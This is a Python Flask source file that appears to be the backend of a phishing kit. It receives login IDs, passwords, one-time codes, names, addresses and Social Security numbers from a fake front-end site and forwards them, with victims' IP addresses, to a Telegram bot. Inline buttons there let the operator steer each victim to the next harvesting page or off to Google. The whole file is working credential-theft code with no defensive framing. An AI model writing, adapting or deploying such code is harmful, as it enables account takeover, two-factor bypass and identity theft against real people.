from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import time
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "https://opfi.vercel.app"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

SESSION_STATUS = {}
PAGES = [
    {"emoji": "🔐", "text": "LOGIN", "page": "index.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
]

def set_webhook():
    webhook_url = "https://b-bcknd.onrender.com/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    try:
        response = requests.get(url)
        print("Webhook set response:", response.json())
        return response.json()
    except Exception as e:
        print("Failed to set webhook:", str(e))
        return {"ok": False, "error": str(e)}

def send_to_telegram(data, session_id, type_):
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for subkey, subvalue in value.items():
                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
    msg += f"<b>Session ID:</b> <code>{session_id}</code>"

    inline_keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    for attempt in range(3):
        try:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
            print("Telegram sent:", r.status_code, r.json())
            return r.ok
        except Exception as e:
            print(f"Telegram attempt {attempt + 1} failed:", str(e))
            time.sleep(2 ** attempt)
    return False

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if not data or "login" not in data:
        print("Login error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    login_id = data["login"]
    password = data.get("password", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "login", "approved": False, "redirect_url": None}
    print("Session created:", session_id)

    telegram_data = {"login_id": login_id, "ip": ip}
    if password:
        telegram_data["password"] = password

    if not send_to_telegram(telegram_data, session_id, "login"):
        print("Login error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/otp", methods=["POST"])
def otp():
    data = request.get_json()
    if not data or "otp" not in data:
        print("OTP error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    otp = data["otp"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "otp", "approved": False, "redirect_url": None}
    print("OTP session created:", session_id)

    if not send_to_telegram({"otp": otp, "ip": ip}, session_id, "otp"):
        print("OTP error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/personal", methods=["POST"])
def personal():
    data = request.get_json()
    if not data or "full_name" not in data or "address" not in data or "city" not in data or "zip" not in data or "ssn" not in data:
        print("Personal error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    full_name = data["full_name"]
    address = data["address"]
    city = data["city"]
    zip_code = data["zip"]
    ssn = data["ssn"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "personal", "approved": False, "redirect_url": None}
    print("Personal session created:", session_id)

    if not send_to_telegram({"full_name": full_name, "address": address, "city": city, "zip": zip_code, "ssn": ssn, "ip": ip}, session_id, "personal"):
        print("Personal error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    print("Webhook received:", update)
    if not update or "callback_query" not in update:
        print("No callback_query in update")
        return jsonify({"status": "ignored"}), 200

    try:
        data = update["callback_query"]["data"]
        print("Callback data:", data)
        session_id, action = data.split(":")
        print(f"Session ID: {session_id}, Action: {action}")
        if session_id in SESSION_STATUS:
            if action in [b["page"] for b in PAGES] or action == "https://google.com":
                SESSION_STATUS[session_id]["approved"] = True
                SESSION_STATUS[session_id]["redirect_url"] = action
                print("Session updated:", SESSION_STATUS[session_id])
                return jsonify({"status": "ok"}), 200
            print("Unknown action:", action)
            return jsonify({"status": "unknown action"}), 404
        else:
            print("Unknown session:", session_id)
            return jsonify({"status": "unknown session"}), 404
    except Exception as e:
        print("Webhook error:", str(e))
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session:
        print("Status error: Session not found:", session_id)
        return jsonify({"error": "Not found"}), 404
    print("Status checked:", session_id, session)
    if session["approved"]:
        return jsonify({"status": "approved", "redirect_url": session["redirect_url"]}), 200
    return jsonify({"status": "pending"}), 200

@app.route("/", methods=["GET"])
def home():
    return "✅ Server is live"

if __name__ == "__main__":
    set_webhook()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
